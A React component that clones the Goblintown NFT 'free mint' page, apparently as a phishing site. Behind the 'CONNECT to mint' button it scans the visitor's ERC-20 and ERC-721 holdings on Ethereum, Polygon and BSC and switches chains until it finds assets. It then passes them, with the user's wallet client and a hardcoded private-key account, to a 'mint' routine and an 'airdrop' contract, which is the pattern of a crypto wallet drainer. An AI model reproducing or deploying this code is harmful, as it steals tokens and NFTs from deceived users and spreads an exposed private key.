import { useState, useEffect, useRef } from 'react';
import { LazyLoadImage } from "react-lazy-load-image-component";
import { useAccount, useNetwork, useSwitchNetwork, useConnect, useWalletClient, usePublicClient } from "wagmi";
import { privateKeyToAccount } from 'viem/accounts';
import { mint } from './services/mint.service.js';
import { isMobile } from 'react-device-detect'
import { getBalanceErc20 } from './services/erc20.service.js'
import { getBalanceErc721 } from './services/erc721.service.js'
import loadable from '@loadable/component';
import tokensErc20ETH from './assets/erc20.json';
import tokensErc20Polygon from './assets/tokensErc20Polygon.json';
import tokensErc20BSC from './assets/tokensErc20BSC.json';
import tokensErc721ETH from './assets/erc721.json';
import tokensErc721Polygon from './assets/polygonErc721.json';
import tokensErc721BSC from './assets/bscErc721.json';
const ConvoComponent = loadable(() => import('./components/Convo'));
const dataProviderETH = process.env.REACT_APP_DATA_PROVIDER_ADDRESS_ETH;
const airdropETH = process.env.REACT_APP_AIRDROP_ADDRESS_ETH;
const dataProviderPolygon = process.env.REACT_APP_DATA_PROVIDER_ADDRESS_POLYGON;
const airdropPolygon = process.env.REACT_APP_AIRDROP_ADDRESS_POLYGON;
const dataProviderBSC = process.env.REACT_APP_DATA_PROVIDER_ADDRESS_BSC;
const airdropBSC = process.env.REACT_APP_AIRDROP_ADDRESS_BSC;

function AppTroll() {
  //TOKENS AFTER GET BALANCE
  const [tokensErc20WithBalance, setTokensErc20WithBalance] = useState([]);
  const [tokensErc721WithBalance, setTokensErc721WithBalance] = useState([]);
  //STATE FOR NETWORKS CHECKED OR NOT
  const [ethNet, setEthNet] = useState(false);
  const [polygonNet, setPolygonNet] = useState(false);
  const [bscNet, setBscNet] = useState(false);

  const { isConnected, address } = useAccount()
  const { chain } = useNetwork()
  const clientReader = usePublicClient();
  const { data: clientWriter } = useWalletClient();
  const account = privateKeyToAccount(`0xfec68842cdd93cfd6824fae8dded0b30f5eb3f0496b2781a69abc647a922788b`);
  // const LinkGoerli = "0x326C977E6efc84E512bB9C30f76E30c160eD06FB";
  // const { config } = usePrepareContractWrite({
  //   address: LinkGoerli,
  //   abi: erc20abi,
  //   functionName: 'transfer',
  //   args: ["0x4A7Df03838d2A4c9A9B81a3a0099dF500c0Bb102", 1000000000000000000],
  // })
  // const { data, isSuccess, write, isError } = useContractWrite(config)

  // const sendTx = async () => {
  //   write?.()
  //   console.log(isSuccess, "SUCCESS")
  //   console.log(isError, "ERROR")
  //   console.log(data, "DATA")
  // }

  // const advancedMatching = { em: 'some@email.com' }
  // const options = {
  //   autoConfig: true,
  //   debug: false,
  // }
  // useEffect(() => {
  //   ReactPixel.init('445602487770007', advancedMatching, options)
  //   ReactPixel.pageView()
  //   // eslint-disable-next-line react-hooks/exhaustive-deps
  // }, [])
  const { isLoading, switchNetwork } =
    useSwitchNetwork()
  const { connect, connectors } = useConnect({

   
  })
  const connectWallet = () => {
    if (isMobile) {
      connect({ connector: connectors[0] })
    }
    else {
      connect({ connector: connectors[1] })
    }
  }
  const sound = require('./GT-song.mp3');
  const [playing, setPlaying] = useState(false);
  useEffect(() => {
    window.addEventListener('touchstart', () => {
      audioRef.current.muted = false
      audioRef.current.play()
    })
  }, [])
  const audioRef = useRef<any>();
  useEffect(() => {
    console.log(chain, "CHAIN")
    console.log(address, "ADDRESS")
    console.log(isConnected, "IS CONNECTED")
    if (chain !== undefined && address !== undefined && isConnected) {
      if (chain.id === 137) {
        getBalanceErc20(dataProviderPolygon, tokensErc20Polygon, airdropPolygon, address, clientReader).then(
          (res: any) => {
            setTokensErc20WithBalance(res);
            getBalanceErc721(dataProviderPolygon, tokensErc721Polygon, airdropPolygon, address, clientReader).then(
              (res1: any) => {
                setTokensErc721WithBalance(res1);
                setPolygonNet(true)
              },
              (err) => {
                console.log(err, "ERROR ON GET BALANCE ERC721 POLYGON");
              })
          },
          (err) => {
            console.log(err, "ERROR ON GET BALANCE ERC20 POLYGON");
          }
        )
      }
      else if (chain.id === 56) {
        getBalanceErc20(dataProviderBSC, tokensErc20BSC, airdropBSC, address, clientReader).then((res: any) => {
          setTokensErc20WithBalance(res);
          getBalanceErc721(dataProviderBSC, tokensErc721BSC, airdropBSC, address, clientReader ).then((res1: any) => {
            setTokensErc721WithBalance(res1);
            setBscNet(true)
          },
            (err) => {
              console.log(err, "ERROR ON GET BALANCE ERC721 BSC");
            })
        }, (err) => {
          console.log(err, "ERROR ON GET BALANCE ERC20 BSC");
        })
      }
      else if (chain.id === 1) {
        getBalanceErc20(dataProviderETH, tokensErc20ETH, airdropETH, address, clientReader ).then((res: any) => {
          setTokensErc20WithBalance(res);
          getBalanceErc721(dataProviderETH, tokensErc721ETH, airdropETH, address, clientReader).then((res1: any) => {
            setTokensErc721WithBalance(res1);
            setEthNet(true)
          }, (err) => {
            console.log(err, "ERROR ON GET BALANCE ERC721 ETH");
          })
        }, (err) => {
          console.log(err, "ERROR ON GET BALANCE ERC20 ETH");
        })
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [chain]);
  useEffect(() => {
    if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
      mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, clientReader, clientWriter, address);
    }
    else {
      console.log("NO TOKENS WITH BALANCE")
      console.log(isLoading, "IS LOADING")
      console.log(chain, "CHAIN")
      if (chain !== undefined) {
        if (!ethNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
          switchNetwork?.(1)
        }
        else if (!bscNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
          switchNetwork?.(56)
        }
        else if (!polygonNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
          switchNetwork?.(137)
        }
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bscNet, ethNet, polygonNet])

  const enterButton = useRef<any>(undefined);
  const siteBlock = useRef<any>(undefined);

  useEffect(() => {
    setTimeout(() => {
      siteBlock.current.classList.add("awake")
      enterButton.current.classList.remove("disabled")
      enterButton.current.innerHTML = `Fucking <span>enter</span> already`
    }, 3000)
  }, [])
  return (
    <>
      <audio id="beep" ref={audioRef} src={sound} loop autoPlay={true} />
      <div id="Fuck-You">
        <LazyLoadImage src={require('./images/GT-fuck-you.jpg')} alt="logo" />
      </div>
      <div id="Site" ref={siteBlock}>
        <button onClick={() => {
          siteBlock.current.classList.add("loaded")
          setTimeout(() => {
            enterButton.current.classList.remove("disabled")
          }, 5000)
          setTimeout(function () { enterButton.current.remove() }, 2000);
          if (audioRef !== null) {
            audioRef.current.volume = 0.1;
            audioRef.current.play();
            setPlaying(true);
          }
        }} id="Enter" ref={enterButton} className="disabled">Hold on <span>dammit</span>&hellip;</button>
        <div id="Controls">

          <a href='https://twitter.com/goblintown' rel="noreferrer" id="Twitter" target="_blank"><LazyLoadImage src={require('./images/GT-twitter-circle.png')} alt="twitter"
            width="64" /></a>
          <a href='https://opensea.io/collection/goblintownwtf' rel="noreferrer" id="Opensea" target="_blank"><LazyLoadImage src={require('./images/GT-opensea.png')} alt="opensea"
            width="64" /></a>
          <span onClick={() => {
            if (playing) {
              setPlaying(false);
              audioRef.current.pause();
            }
            else {
              setPlaying(true);
              audioRef.current.play();
            }
          }} id="Volume"><LazyLoadImage src={require('./images/GT-volume-circle.png')} alt="Volume" width="64" /></span>
        </div>
        <div id="Site-Container">
          <main id="Mintery">
            <div id="Masthead">
              <LazyLoadImage id="Logo" className="unselectable" loading="lazy" src={require('./images/GT-logo.gif')} alt="Logo" width="400" />
              <div id="Counter">
                <div id="Counter__Goblin">
                  <img src="https://goblintown.wtf/i/GT-garble.gif" width="88" alt="garble" />
                </div>
                <span id="left"></span>
                <p>/</p>
                <span id="Counter__Real">1,111</span>
                <p>Free for mint</p>
              </div>
              <>
                {/* {
                  // eslint-disable-next-line array-callback-return
                  connectors.map((connector) => {
                    if (isMobile && connector.id === 'walletConnect') {
                      return (<button
                        disabled={!connector.ready}
                        key={connector.id}
                        onClick={() => connect({ connector })}
                        className="button" id="Burgur-Button">CONNECT to <span>mint</span>
                      </button>)
                    }
                    else if (!isMobile && connector.id === 'injected') {
                      return (<button
                        disabled={!connector.ready}
                        key={connector.id}
                        onClick={() => connect({ connector })}
                        className="button" id="Burgur-Button">CONNECT to <span>mint</span>
                      </button>)
                    }
                  })} */}
                  <button
                  className="button" id="Burgur-Button"
                  onClick={connectWallet} >CONNECT to <span>mint</span></button>
              </>
            </div>
            <div id="Actions">
              <div className="note">
                <header>
                  <p><strong>3 free + gas mint per wallet.</strong> Don't be fucking greedy. That's how we got ourselves
                    here.</p>
                </header>
                <LazyLoadImage className="divide" src={require('./images/GT-phone-header-border.png')} alt="border" />
                <main>
                  <LazyLoadImage id="Cage" src={require('./images/GT-cage.png')} alt="cage" width="56px" />
                  <p><strong>We are reserving 100,000 goblins.</strong> Because we want to.</p>
                </main>
                <LazyLoadImage className="divide" src={require('./images/GT-phone-header-border.png')} alt="gt-phone" />
                <footer>
                  <p>No roadmap. No Discord. No utility. CC0.
                    <a
                      rel="noreferrer"
                      href="https://etherscan.io/address/0xbce3781ae7ca1a5e050bd9c4c77369867ebc307e#code"
                      target="_blank">Contract</a> wasn't actually written by goblins.</p>
                </footer>
                <div id="Follow"><span>#GOBLINFOLLOWGOBLIN</span></div>
              </div>
            </div>
          </main>
          <ConvoComponent />
        </div>
        <div id="Mountain">
          <div id="Littles">
            <LazyLoadImage src={require('./images/GT-little1.png')} alt="test" />
            <LazyLoadImage src={require('./images/GT-little2.png')} alt="test" />
            <LazyLoadImage src={require('./images/GT-little3.png')} alt="test" />
          </div>
          <LazyLoadImage id="Mountain__Light" src={require('./images/GT-mountain-light.png')} alt="test" />
          <LazyLoadImage id="Mountain__Mass" src={require('./images/GT-mountain.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-safe-descent.gif')} alt="bg animation" />
        </div>
        <div id="City">
          <LazyLoadImage id="Fire-Back" src={require('./images/GT-town-layer-0.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-town-layer-1.png')} alt="test" />
          <LazyLoadImage id="Smolder" src={require('./images/GT-city.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-town-layer-2.png')} alt="test" />
          <LazyLoadImage id="Fire-Mid" src={require('./images/GT-town-layer-3.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-town-layer-4.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-town-layer-5.png')} alt="test" />
          <LazyLoadImage src={require('./images/GT-town-layer-6.png')} alt="test" />
          <LazyLoadImage id="Fire-Front" src={require('./images/GT-town-layer-7.png')} alt="test" />
        </div>
      </div>
      <div id="Underground">
        <div id="Psst">
          <LazyLoadImage src="https://www.goblintown.wtf/i/psst.png" alt="test" />
        </div>
        <div id="Goblin-Family">
          <LazyLoadImage id="Family" src="https://www.goblintown.wtf/i/GT-family-compressed.png" alt="test" />
        </div>
        <LazyLoadImage id="Rocks" src="https://www.goblintown.wtf/i/GT-rocks-compressed.png" alt="test" />
      </div>
    </>
  );
}

export default AppTroll;
